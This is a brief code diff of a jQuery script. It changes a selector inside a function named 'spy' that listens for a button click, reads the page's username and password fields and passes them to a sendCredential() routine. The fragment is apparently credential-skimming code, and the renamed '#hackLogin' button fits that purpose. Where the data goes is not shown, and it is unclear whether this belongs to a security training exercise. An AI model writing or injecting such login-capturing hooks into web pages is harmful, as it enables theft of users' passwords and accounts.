@@ -41,7 +41,7 @@ $(window).on('load', function() {
 // Add listener to the form submited
 var spy = function() {
     $(document).ready(function() {
-        $('#doLogin_0').on("click", function() {
+        $('#hackLogin').on("click", function() {
             sendCredential($('#doLogin_username').val(), $('#doLogin_password').val());
         });
     });
